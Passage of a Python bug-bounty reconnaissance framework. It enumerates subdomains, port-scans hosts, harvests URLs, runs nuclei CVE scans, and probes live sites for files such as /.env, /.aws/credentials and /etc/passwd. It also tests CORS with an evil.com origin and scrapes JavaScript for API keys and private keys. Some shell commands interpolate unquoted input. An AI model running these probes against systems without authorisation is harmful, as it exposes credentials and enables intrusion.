#!/usr/bin/env python3
# =============================================================================
#
#  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
#  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
#  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
#  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
#   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
#    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
#
#  ████████╗███████╗ ██████╗██╗  ██╗
#  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
#     ██║   █████╗  ██║     ███████║
#     ██║   ██╔══╝  ██║     ██╔══██║
#     ██║   ███████╗╚██████╗██║  ██║
#     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
#
#  [ v3nom tech ]
#  Instagram : @venom.tech.official
#  GitHub    : https://github.com/v3nomtech
#
# =============================================================================
"""
P1 Bug Bounty Recon — Mega All-in-One Framework
17 phases: full recon → CVE scanning → active exploitation → HTML report

Phases:
  1  Subdomain Enumeration
  2  DNS Resolution & HTTP Probing
  3  Port & Service Scanning
  4  URL & Endpoint Discovery
  5  Nuclei CVE & Critical Vuln Scan
  6  Manual P1 Checks (CORS/redirect/takeover/paths)
  7  SSL/TLS Analysis
  8  CVE-Specific Exploit Checks (nmap NSE)
  9  JS Deep Secret & Endpoint Analyzer
  10 SSRF Active Testing
  11 XSS / SQLi / SSTI Active Scanner
  12 Cloud Misconfiguration (S3/Azure/GCP/Firebase)
  13 API Security (Swagger/GraphQL/JWT/Mass-Assignment)
  14 IDOR / BOLA Hunter
  15 Subdomain Monitor (continuous delta tracking)
  16 HTML + Markdown Report Builder
"""

import argparse
import base64
import concurrent.futures
import hashlib
import hmac as hmac_mod
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

# ══════════════════════════════════════════════════════════════
# COLOURS & OUTPUT
# ══════════════════════════════════════════════════════════════
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
  ██╗   ██╗██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗
  ██║   ██║╚════██╗████╗  ██║██╔═══██╗████╗ ████║
  ██║   ██║ █████╔╝██╔██╗ ██║██║   ██║██╔████╔██║
  ╚██╗ ██╔╝ ╚═══██╗██║╚██╗██║██║   ██║██║╚██╔╝██║
   ╚████╔╝ ██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═══╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝

  ████████╗███████╗ ██████╗██╗  ██╗
  ╚══██╔══╝██╔════╝██╔════╝██║  ██║
     ██║   █████╗  ██║     ███████║
     ██║   ██╔══╝  ██║     ██╔══██║
     ██║   ███████╗╚██████╗██║  ██║
     ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
{C.RESET}{C.GREEN}  [ v3nom tech ]  |  Instagram: @venom.tech.official  |  GitHub: https://github.com/v3nomtech
{C.RESET}{C.RED}{C.BOLD}
          ████████████████████████
       ███                        ███
     ██        ████████████          ██
    ██       ███            ███        ██
   ██       ██    ████████    ██        ██
   ██      ██   ████    ████   ██       ██
   ██      ██   ██  ████  ██   ██       ██
   ██      ██   ████    ████   ██       ██
   ██       ██    ████████    ██        ██
    ██       ███            ███        ██
     ██        ████████████          ██
       ███                        ███
          ████████████████████████

   ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗███████╗██╗   ██╗███████╗
   ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║██╔════╝╚██╗ ██╔╝██╔════╝
   ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║█████╗   ╚████╔╝ █████╗
   ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝    ╚██╔╝  ██╔══╝
    ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗   ██║   ███████╗
     ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝
   MEGA All-in-One Bug Bounty Framework  |  17 Phases
{C.RESET}""")

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def ok(msg):      print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def crit(msg):    print(f"{C.RED}{C.BOLD}[CRITICAL]{C.RESET} {msg}")
def section(msg): print(f"\n{C.CYAN}{C.BOLD}{'═'*62}\n  {msg}\n{'═'*62}{C.RESET}")

# ══════════════════════════════════════════════════════════════
# CORE HELPERS
# ══════════════════════════════════════════════════════════════
VERBOSE = False

def run(cmd: str, output_file: Optional[str] = None, timeout: int = 600) -> subprocess.CompletedProcess:
    if VERBOSE:
        info(f"Running: {C.YELLOW}{cmd[:120]}{C.RESET}")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        if output_file:
            Path(output_file).write_text(result.stdout)
        return result
    except subprocess.TimeoutExpired:
        warn(f"Timeout after {timeout}s")
        return subprocess.CompletedProcess(cmd, 1, "", "timeout")
    except Exception as e:
        warn(f"Command failed: {e}")
        return subprocess.CompletedProcess(cmd, 1, "", str(e))

def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None

def count_lines(path: str) -> int:
    try:
        return sum(1 for _ in open(path) if _.strip())
    except Exception:
        return 0

def unique_lines(files: list[str], output: str):
    seen: set[str] = set()
    with open(output, "w") as out:
        for f in files:
            try:
                for line in open(f):
                    line = line.strip()
                    if line and line not in seen:
                        seen.add(line)
                        out.write(line + "\n")
            except FileNotFoundError:
                pass

def read_set(path: str) -> set[str]:
    try:
        return {l.strip() for l in open(path) if l.strip()}
    except FileNotFoundError:
        return set()

def write_set(path: str, data: set[str]):
    Path(path).write_text("\n".join(sorted(data)) + "\n")

# ── shared regex constants used across multiple phases ────────────────────────
_HTML_START_RE = re.compile(r'^\s*(<\?xml|<!doctype|<html)', re.IGNORECASE)

_JS_FP_RE = re.compile(
    r'(?i)(example|placeholder|your[_\-]?|xxx+|test|dummy|sample|demo|'
    r'changeme|change_me|replace_?me|insert_?here|todo|fixme|'
    r'<[^>]+>|\$\{[^}]+\}|#\{[^}]+\}|%[A-Z_]+%|__[A-Z_]+__|'
    r'\*{3,}|n/?a\b|none|null|undefined|'
    r'0{6,}|1{6,}|123456|abcdef|aaaaaa|'
    r'my_?secret|my_?password|my_?token|my_?key|'
    r'some_?secret|some_?key|some_?token|'
    r'secret_?key|secret_?token|supersecret|'
    r'passwd|password|p@ssw0rd|'
    r'localhost|127\.0\.0\.1|0\.0\.0\.0)'
)

# ── curl helpers (each returns a different shape for its consumer) ─────────────
def _curl_simple(url: str, timeout: int = 10, extra_headers: list[str] | None = None) -> tuple[int, str]:
    """Returns (status_code, body)."""
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-o", "-",
           "-w", "\n__SC__%{http_code}", "-L", "--max-redirs", "3",
           "-A", "Mozilla/5.0"]
    if extra_headers:
        for h in extra_headers:
            cmd += ["-H", h]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        m = re.search(r"\n__SC__(\d+)$", r.stdout)
        sc = int(m.group(1)) if m else 0
        body = re.sub(r"\n__SC__\d+$", "", r.stdout)
        return sc, body
    except Exception:
        return 0, ""

def _curl_timed(url: str, timeout: int = 10) -> tuple[int, float, str]:
    """Returns (status_code, elapsed_seconds, body)."""
    start = time.time()
    try:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout), "-o", "-",
             "-w", "\n__SC__%{http_code}", "-L", "--max-redirs", "3",
             "-A", "Mozilla/5.0", url],
            capture_output=True, text=True, timeout=timeout + 2
        )
        elapsed = time.time() - start
        m = re.search(r"\n__SC__(\d+)$", r.stdout)
        sc = int(m.group(1)) if m else 0
        body = re.sub(r"\n__SC__\d+$", "", r.stdout)
        return sc, elapsed, body
    except Exception:
        return 0, time.time() - start, ""

def _curl_req(url: str, cookie: str = "", method: str = "GET", timeout: int = 10) -> tuple[int, int, str, dict]:
    """Returns (status_code, body_length, body_snippet, headers_dict)."""
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-X", method,
           "-o", "-", "-D", "-", "-L", "--max-redirs", "3", "-A", "Mozilla/5.0"]
    if cookie:
        cmd += ["-H", f"Cookie: {cookie}"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        raw = r.stdout
        sep = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
        hdr_block, body = (raw.split(sep, 1) if sep in raw else (raw, ""))
        sc_match = re.search(r"HTTP/[\d.]+ (\d+)", hdr_block)
        sc = int(sc_match.group(1)) if sc_match else 0
        hdrs: dict[str, str] = {}
        for line in hdr_block.splitlines()[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                hdrs[k.strip().lower()] = v.strip()
        return sc, len(body), body[:500], hdrs
    except Exception:
        return 0, 0, "", {}

def _curl_api(url: str, method: str = "GET", headers: dict | None = None,
              data: dict | str | list | None = None, timeout: int = 10) -> tuple[int, dict, str]:
    """Returns (status_code, response_headers_dict, body)."""
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-X", method,
           "-o", "-", "-D", "-", "-L", "--max-redirs", "3", "-A", "Mozilla/5.0"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if data is not None:
        body_str = json.dumps(data) if isinstance(data, (dict, list)) else str(data)
        cmd += ["-d", body_str]
        if isinstance(data, (dict, list)) and not (headers and "Content-Type" in headers):
            cmd += ["-H", "Content-Type: application/json"]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        raw = r.stdout
        sep = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
        hdr_block, body = (raw.split(sep, 1) if sep in raw else (raw, ""))
        sc_match = re.search(r"HTTP/[\d.]+ (\d+)", hdr_block)
        sc = int(sc_match.group(1)) if sc_match else 0
        hdrs: dict[str, str] = {}
        for line in hdr_block.splitlines()[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                hdrs[k.strip().lower()] = v.strip()
        return sc, hdrs, body
    except Exception:
        return 0, {}, ""

def _fetch_js(url: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout),
             "-A", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
             "--compressed", url],
            capture_output=True, text=True, timeout=timeout + 2
        )
        return r.stdout if r.returncode == 0 else ""
    except Exception:
        return ""

# ══════════════════════════════════════════════════════════════
# PHASE 1 — Subdomain Enumeration
# ══════════════════════════════════════════════════════════════
def phase_subdomain(domain: str, out_dir: str, fast: bool) -> str:
    section("PHASE 1 — Subdomain Enumeration")
    parts = []

    if tool_exists("subfinder"):
        f = f"{out_dir}/subs_subfinder.txt"
        run(f"subfinder -d {domain} -silent -o {f}", timeout=300)
        ok(f"subfinder → {count_lines(f)} subdomains")
        parts.append(f)

    if tool_exists("amass") and not fast:
        f = f"{out_dir}/subs_amass.txt"
        run(f"amass enum -passive -d {domain} -o {f}", timeout=600)
        ok(f"amass → {count_lines(f)} subdomains")
        parts.append(f)

    if tool_exists("assetfinder"):
        f = f"{out_dir}/subs_assetfinder.txt"
        run(f"assetfinder --subs-only {domain} > {f}", timeout=120)
        ok(f"assetfinder → {count_lines(f)} subdomains")
        parts.append(f)

    crt_file = f"{out_dir}/subs_crtsh.txt"
    r = run(f'curl -s "https://crt.sh/?q=%.{domain}&output=json"', timeout=30)
    if r.returncode == 0 and r.stdout.strip():
        try:
            entries = json.loads(r.stdout)
            subs: set[str] = set()
            for e in entries:
                for name in e.get("name_value", "").split("\n"):
                    name = name.strip().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        subs.add(name)
            Path(crt_file).write_text("\n".join(sorted(subs)))
            ok(f"crt.sh → {len(subs)} subdomains")
            parts.append(crt_file)
        except Exception:
            warn("crt.sh JSON parse failed")

    merged = f"{out_dir}/subdomains_all.txt"
    unique_lines(parts, merged)

    # Remove stale DHCP/reverse-DNS noise: entries like user65-223-110-134.example.com
    # or 208-251-75-92.example.com are old ISP hostnames, not real subdomains
    _STALE_RE = re.compile(
        r'^(user\d|[0-9]{2,3}[-\.][0-9]{2,3}[-\.][0-9]{2,3}[-\.][0-9]{2,3}\.)',
        re.IGNORECASE
    )
    cleaned: list[str] = []
    stale = 0
    for line in read_set(merged):
        if _STALE_RE.match(line):
            stale += 1
        else:
            cleaned.append(line)
    if stale:
        Path(merged).write_text("\n".join(sorted(cleaned)) + "\n")
        warn(f"Filtered {stale} stale DHCP/reverse-DNS entries")

    ok(f"Total unique subdomains: {C.BOLD}{count_lines(merged)}{C.RESET}")
    return merged

# ══════════════════════════════════════════════════════════════
# PHASE 2 — DNS Resolution & HTTP Probing
# ══════════════════════════════════════════════════════════════
def phase_dns_probe(subs_file: str, out_dir: str) -> tuple[str, str]:
    section("PHASE 2 — DNS Resolution & HTTP Probing")

    resolved = f"{out_dir}/resolved.txt"
    if tool_exists("dnsx"):
        # -t 100 threads, -rl 500 rate-limit, -retry 2 for reliability
        run(f"dnsx -l {subs_file} -silent -o {resolved} -t 100 -rl 500 -retry 2", timeout=600)
        ok(f"Resolved hosts: {count_lines(resolved)}")
        # Fallback: if dnsx returned nothing (network issue / rate-limit),
        # probe all subdomains directly with httpx so nothing is skipped
        if count_lines(resolved) == 0:
            warn("dnsx resolved 0 hosts — falling back to direct httpx probe on all subdomains")
            shutil.copy(subs_file, resolved)
    else:
        shutil.copy(subs_file, resolved)

    live_file  = f"{out_dir}/live_hosts.txt"
    httpx_json = f"{out_dir}/httpx_full.json"
    if tool_exists("httpx"):
        run(f"httpx -l {resolved} -silent -status-code -title -tech-detect "
            f"-follow-redirects -json -o {httpx_json} -threads 50 -timeout 10", timeout=600)
        run(f"httpx -l {resolved} -silent -o {live_file} -threads 50 -timeout 10", timeout=600)
        ok(f"Live HTTP hosts: {count_lines(live_file)}")
        # Second fallback: if httpx found nothing on resolved list, try raw subs directly
        if count_lines(live_file) == 0 and count_lines(resolved) > 0:
            warn("httpx found 0 live hosts on resolved list — retrying directly on subdomains")
            run(f"httpx -l {subs_file} -silent -o {live_file} -threads 50 -timeout 10", timeout=600)
            ok(f"Live HTTP hosts (direct probe): {count_lines(live_file)}")
    else:
        shutil.copy(resolved, live_file)

    return resolved, live_file

# ══════════════════════════════════════════════════════════════
# PHASE 3 — Port & Service Scanning
# ══════════════════════════════════════════════════════════════
def phase_ports(resolved_file: str, out_dir: str, full_ports: bool):
    section("PHASE 3 — Port & Service Scanning")
    ports = "0-65535" if full_ports else (
        "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,"
        "1433,1521,1723,3306,3389,5432,5900,6379,7001,8080,8443,"
        "8888,9000,9090,9200,9300,11211,27017,28017"
    )
    naabu_out = f"{out_dir}/ports_naabu.txt"
    if tool_exists("naabu"):
        run(f"naabu -l {resolved_file} -p {ports} -silent -o {naabu_out} -rate 1000", timeout=600)
        ok(f"Open ports: {count_lines(naabu_out)}")

    nmap_out = f"{out_dir}/nmap_services.xml"
    if tool_exists("nmap") and Path(naabu_out).exists():
        hosts_for_nmap = f"{out_dir}/nmap_hosts.txt"
        run(f"cut -d: -f1 {naabu_out} | sort -u > {hosts_for_nmap}", timeout=10)
        run(f"nmap -iL {hosts_for_nmap} -sV -sC -O --open -T4 "
            f"-oX {nmap_out} -oN {out_dir}/nmap_services.txt "
            f"--script=banner,ssl-cert,ssl-enum-ciphers,http-auth-finder 2>/dev/null", timeout=900)
        ok(f"Nmap scan complete → {nmap_out}")

# ══════════════════════════════════════════════════════════════
# PHASE 4 — URL & Endpoint Discovery
# ══════════════════════════════════════════════════════════════
def phase_urls(domain: str, live_file: str, out_dir: str) -> str:
    section("PHASE 4 — URL & Endpoint Discovery")
    parts = []

    if tool_exists("gau"):
        f = f"{out_dir}/urls_gau.txt"
        run(f"gau --subs {domain}", output_file=f, timeout=300)
        ok(f"gau → {count_lines(f)} URLs")
        parts.append(f)

    if tool_exists("waybackurls"):
        f = f"{out_dir}/urls_wayback.txt"
        run(f"echo {domain} | waybackurls > {f}", timeout=180)
        ok(f"waybackurls → {count_lines(f)} URLs")
        parts.append(f)

    if tool_exists("katana"):
        f = f"{out_dir}/urls_katana.txt"
        run(f"katana -list {live_file} -silent -d 3 -jc "
            f"-ef css,png,jpg,gif,ico,svg,woff,woff2,ttf,eot "
            f"-o {f} -timeout 15 -c 20", timeout=600)
        ok(f"katana → {count_lines(f)} URLs")
        parts.append(f)

    if tool_exists("hakrawler"):
        f = f"{out_dir}/urls_hakrawler.txt"
        run(f"cat {live_file} | hakrawler -subs -d 3 -u -t 20 > {f} 2>/dev/null", timeout=300)
        ok(f"hakrawler → {count_lines(f)} URLs")
        parts.append(f)

    merged = f"{out_dir}/urls_all.txt"
    unique_lines(parts, merged)
    ok(f"Total unique URLs: {count_lines(merged)}")

    params_file = f"{out_dir}/params.txt"
    run(f"grep -E '\\?[^\\s]+=' {merged} | sort -u > {params_file}", timeout=30)
    ok(f"Param URLs: {count_lines(params_file)}")

    # Passive: extract JS URLs from merged URL pool
    js_file = f"{out_dir}/js_files.txt"
    run(f"grep -iE '\\.js(\\?|#|$)' {merged} | sort -u > {js_file}", timeout=30)

    # Active: fetch each live host HTML and scrape <script src> tags
    js_active = f"{out_dir}/js_active.txt"
    run(
        f"while IFS= read -r host; do "
        f"curl -sk -L --max-time 10 \"$host\" 2>/dev/null "
        f"| grep -oiP 'src=[\"\\x27][^\"\\x27]+\\.js[^\"\\x27]*' "
        f"| sed 's/^src=//I;s/[\"\\x27]//g'; "
        f"done < {live_file} > {js_active}",
        timeout=300
    )
    # Resolve relative JS paths to absolute URLs
    js_resolved = f"{out_dir}/js_resolved.txt"
    run(
        f"while IFS= read -r path; do "
        f"case \"$path\" in "
        f"http*) echo \"$path\" ;; "
        f"/*) while IFS= read -r h; do echo \"${{h%/}}$path\"; done < {live_file} ;; "
        f"*) while IFS= read -r h; do echo \"${{h%/}}/$path\"; done < {live_file} ;; "
        f"esac; done < {js_active} | sort -u > {js_resolved}",
        timeout=60
    )
    # Merge passive + active JS lists
    run(f"sort -u {js_file} {js_resolved} -o {js_file} 2>/dev/null || "
        f"cat {js_file} {js_resolved} | sort -u > {js_file}.tmp && mv {js_file}.tmp {js_file}",
        timeout=30)
    ok(f"JS files: {count_lines(js_file)}")

    return merged

# ══════════════════════════════════════════════════════════════
# PHASE 5 — Nuclei CVE & Critical Vuln Scan
# ══════════════════════════════════════════════════════════════
def phase_nuclei(live_file: str, out_dir: str, fast: bool):
    section("PHASE 5 — Nuclei CVE & Critical Vulnerability Scanning")
    if not tool_exists("nuclei"):
        warn("nuclei not found — skipping")
        return

    run("nuclei -update-templates -silent", timeout=120)

    nuclei_output = f"{out_dir}/nuclei_findings.txt"
    nuclei_json   = f"{out_dir}/nuclei_findings.json"
    severity = "critical,high" if fast else "critical,high,medium"
    tags = ("cve,rce,sqli,ssrf,ssti,lfi,xxe,idor,auth-bypass,"
            "default-login,exposed-panel,misconfig,takeover,"
            "injection,xss,file-upload,deserialization")

    run(f"nuclei -l {live_file} -severity {severity} -tags {tags} "
        f"-o {nuclei_output} -jle {nuclei_json} "
        f"-rate-limit 150 -bs 25 -c 25 "
        f"-timeout 10 -retries 1 -silent 2>/dev/null", timeout=3600)

    _parse_nuclei(nuclei_json, out_dir)

def _parse_nuclei(json_file: str, out_dir: str):
    if not Path(json_file).exists():
        warn("No nuclei JSON output found")
        return
    findings: dict[str, list] = {"critical": [], "high": [], "medium": [], "low": []}
    try:
        for line in open(json_file):
            line = line.strip()
            if not line:
                continue
            try:
                item = json.loads(line)
                if not isinstance(item, dict):
                    continue
                info_obj = item.get("info") or {}
                if not isinstance(info_obj, dict):
                    info_obj = {}
                sev = info_obj.get("severity", "info").lower()
                if sev in findings:
                    findings[sev].append(item)
            except (json.JSONDecodeError, AttributeError):
                continue
    except FileNotFoundError:
        return

    report_lines = []
    for sev in ["critical", "high", "medium"]:
        items = findings[sev]
        if not items:
            continue
        label = f"[{sev.upper()}]"
        (crit if sev == "critical" else warn)(f"{len(items)} {sev.upper()} nuclei findings")
        for item in items:
            info_block = item.get("info", {})
            name  = info_block.get("name", "Unknown")
            url   = item.get("matched-at", item.get("host", ""))
            classification = info_block.get("classification") or {}
            if not isinstance(classification, dict):
                classification = {}
            cvss = classification.get("cvss-score", "")
            cve  = classification.get("cve-id", [])
            if isinstance(cve, str):
                cve = [cve] if cve else []
            cve_s = ", ".join(cve) if cve else ""
            line  = f"  {label} {name} | {url}"
            if cvss:  line += f" | CVSS: {cvss}"
            if cve_s: line += f" | {cve_s}"
            print(line)
            report_lines.append(line)

    p1_report = f"{out_dir}/P1_FINDINGS.txt"
    with open(p1_report, "w") as f:
        f.write(f"P1 Findings — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        for line in report_lines:
            f.write(line + "\n")
    ok(f"P1 findings → {p1_report}")

# ══════════════════════════════════════════════════════════════
# PHASE 6 — Manual P1 Checks
# ══════════════════════════════════════════════════════════════
def phase_manual_checks(live_file: str, urls_file: str, out_dir: str):
    section("PHASE 6 — Manual P1 Checks")
    manual_dir = f"{out_dir}/manual_checks"
    os.makedirs(manual_dir, exist_ok=True)
    _check_open_redirect(urls_file, manual_dir)
    _check_exposed_paths(live_file, manual_dir)
    _check_cors(live_file, manual_dir)
    _check_subdomain_takeover(live_file, manual_dir)
    _check_ssrf_params(urls_file, manual_dir)
    _check_js_secrets_quick(out_dir, manual_dir)

def _check_open_redirect(urls_file: str, out_dir: str):
    info("Checking open redirect candidates…")
    params = ["url","redirect","next","return","returnUrl","return_to","goto","destination",
              "redir","redirect_uri","callback","out","view","to","target","link","src","source"]
    pattern = "|".join(params)
    out = f"{out_dir}/open_redirect_candidates.txt"
    # Only keep candidates where the param value looks like a full or protocol-relative URL
    # (could redirect off-domain). Relative paths like ?redirect=/foo are filtered out here;
    # confirmation with actual curl redirect check happens in phase 11.
    run(
        f"grep -iE '[?&]({pattern})=' {urls_file} "
        f"| grep -iP '[?&](?:{pattern})=(?:https?%3A%2F%2F|https?://|//|%2F%2F)' "
        f"| sort -u > {out}",
        timeout=30
    )
    # If strict filter found nothing, fall back to all candidates (phase 11 will confirm)
    if count_lines(out) == 0:
        run(f"grep -iE '[?&]({pattern})=' {urls_file} | sort -u > {out}", timeout=30)
    ok(f"Open redirect candidates (to confirm in phase 11): {count_lines(out)}")

def _check_exposed_paths(live_file: str, out_dir: str):
    info("Probing exposed sensitive paths…")
    # Paths that must return non-HTML content to be real findings
    data_paths = [
        "/.env","/.git/config","/.git/HEAD","/wp-config.php","/config.php",
        "/config.json","/config.yml","/.aws/credentials","/.docker/config.json",
        "/etc/passwd","/proc/self/environ",
        "/swagger.json","/openapi.json","/api-docs","/v2/api-docs",
        "/actuator/env","/actuator/heapdump","/actuator/logfile",
        "/.DS_Store","/server-status","/phpinfo.php","/info.php",
        "/backup.zip","/dump.sql","/db.sql",
        "/api/v1/users","/api/v2/users","/trace","/debug",
    ]
    # Admin UI paths — a 200 response page is interesting regardless of Content-Type
    ui_paths = [
        "/admin","/phpmyadmin","/adminer.php","/console",
        "/graphql","/graphiql","/actuator",
    ]
    paths = data_paths + ui_paths
    paths_file = f"{out_dir}/sensitive_paths.txt"
    Path(paths_file).write_text("\n".join(paths))
    exposed_out = f"{out_dir}/exposed_paths.txt"

    if tool_exists("httpx"):
        probe_urls = f"{out_dir}/paths_probe_urls.txt"
        run(f"while IFS= read -r h; do while IFS= read -r p; do "
            f'echo "${{h%/}}$p"; done < {paths_file}; done < {live_file} > {probe_urls}', timeout=30)
        # Probe with JSON output so we can inspect content-type and body
        probe_json = f"{out_dir}/paths_probe_raw.json"
        run(f"httpx -l {probe_urls} -silent -mc 200 -json "
            f"-o {probe_json} -threads 50 -timeout 8 2>/dev/null", timeout=600)

        # Filter: reject HTML responses for data paths; allow any for UI paths
        confirmed: list[str] = []
        if Path(probe_json).exists():
            ui_set = set(ui_paths)
            for line in open(probe_json, errors="ignore"):
                line = line.strip()
                if not line:
                    continue
                try:
                    item = json.loads(line)
                except json.JSONDecodeError:
                    continue
                url = item.get("url","")
                ct  = item.get("content_type","").lower()
                # Determine which path was probed
                path_hit = next((p for p in paths if url.rstrip("/").endswith(p.rstrip("/"))), None)
                if path_hit in ui_set:
                    # Admin UIs: any 200 is interesting
                    confirmed.append(url)
                else:
                    # Data paths: reject HTML — only real data files matter
                    if "html" not in ct:
                        confirmed.append(url)
        Path(exposed_out).write_text("\n".join(sorted(set(confirmed))) + ("\n" if confirmed else ""))
    else:
        run(f"while read host; do for p in {' '.join(data_paths[:10])}; do "
            f'curl -sk -o /dev/null -w "%{{http_code}} $host$p\\n" "$host$p"; '
            f"done; done < {live_file} | grep -v '^404' > {exposed_out}", timeout=300)
    ok(f"Exposed paths: {count_lines(exposed_out)}")

def _check_cors(live_file: str, out_dir: str):
    info("Checking CORS misconfigurations…")
    out = f"{out_dir}/cors_issues.txt"
    script = f"""while IFS= read -r url; do
    resp=$(curl -sk -I -H "Origin: https://evil.com" "$url" 2>/dev/null)
    acao=$(echo "$resp" | grep -i "access-control-allow-origin" | tr -d '\r')
    acac=$(echo "$resp" | grep -i "access-control-allow-credentials" | tr -d '\r')
    creds=$(echo "$acac" | grep -oi "true" || true)
    if echo "$acao" | grep -qiE "evil\\.com"; then
        echo "[CORS:REFLECT] $url | $acao | $acac"
    elif echo "$acao" | grep -qiE "\\*" && [ "$creds" = "true" ]; then
        echo "[CORS:WILDCARD+CREDS] $url | $acao | $acac"
    fi
done < {live_file} > {out}"""
    try:
        result = subprocess.run(['bash', '-c', script], capture_output=True, text=True, timeout=300)
    except Exception as e:
        warn(f"CORS check failed: {e}")
    n = count_lines(out)
    (crit if n else ok)(f"CORS misconfigurations: {n}")

def _check_subdomain_takeover(live_file: str, out_dir: str):
    info("Checking subdomain takeover signatures…")
    sigs = {
        "GitHub Pages":"There isn't a GitHub Pages site here",
        "Heroku":"no such app","Shopify":"Sorry, this shop is currently unavailable",
        "Fastly":"Fastly error: unknown domain","Tumblr":"Whatever you were looking for doesn't live here",
        "WordPress":"Do you want to register","Zendesk":"Help Center Closed",
        "S3":"NoSuchBucket","Azure":"404 Web Site not found",
        "Surge":"project not found","Readme.io":"Project doesnt exist",
    }
    out = f"{out_dir}/takeover_candidates.txt"
    with open(out, "w") as outf:
        try:
            hosts = [l.strip() for l in open(live_file) if l.strip()][:200]
        except FileNotFoundError:
            return
        for host in hosts:
            r = run(f"curl -sk --max-time 8 '{host}'", timeout=15)
            for service, sig in sigs.items():
                if sig.lower() in r.stdout.lower():
                    msg = f"[TAKEOVER?] {host} → {service}"
                    crit(msg); outf.write(msg + "\n")
                    break
    ok(f"Takeover candidates: {count_lines(out)}")

def _check_ssrf_params(urls_file: str, out_dir: str):
    info("Extracting SSRF-prone parameters…")
    ssrf_params = ["url","uri","link","src","source","href","action","host","proxy",
                   "fetch","load","path","dest","destination","redirect","request",
                   "webhook","callback","endpoint","api_url","base_url","feed","import","image_url","file"]
    pattern = "|".join(ssrf_params)
    out = f"{out_dir}/ssrf_candidates.txt"
    run(f"grep -iE '[?&]({pattern})=' {urls_file} | sort -u > {out}", timeout=30)
    ok(f"SSRF candidates: {count_lines(out)}")

def _check_js_secrets_quick(out_dir: str, manual_dir: str):
    info("Quick JS secret scan…")
    js_file = f"{out_dir}/js_files.txt"
    if not Path(js_file).exists() or count_lines(js_file) == 0:
        return
    # Use same high-confidence patterns as deep JS analyzer
    quick_patterns = {
        "AWS Key":          r"AKIA[0-9A-Z]{16}",
        "GitHub Token":     r"gh[pousr]_[0-9a-zA-Z]{36,}",
        "Google API Key":   r"AIza[0-9A-Za-z\-_]{35}",
        "Stripe Live Key":  r"sk_live_[0-9a-zA-Z]{24,}",
        "Private Key":      r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY",
        "JWT":              r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}",
        "Database URL":     r"(mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|mssql)://[^\s\"'<>@]+:[^\s\"'<>@]{6,}@(?!localhost|127\.|0\.0\.0|example)[^\s\"'<>]+",
    }
    out = f"{manual_dir}/js_secrets.txt"
    with open(out, "w") as outf:
        js_urls = [l.strip() for l in open(js_file) if l.strip()][:300]
        for js_url in js_urls:
            # Use subprocess list to avoid shell injection from URLs containing quotes
            try:
                r = subprocess.run(
                    ["curl","-sk","--max-time","10","-A","Mozilla/5.0",js_url],
                    capture_output=True, text=True, timeout=15)
            except Exception:
                continue
            if not r.stdout:
                continue
            for label, pattern in quick_patterns.items():
                for m in re.findall(pattern, r.stdout):
                    val = m if isinstance(m, str) else m[0]
                    if _JS_FP_RE.search(val):
                        continue
                    finding = f"[SECRET:{label}] {js_url} → {val[:80]}"
                    crit(finding); outf.write(finding + "\n")
    ok(f"Quick JS secrets: {count_lines(out)}")

# ══════════════════════════════════════════════════════════════
# PHASE 7 — SSL/TLS Analysis
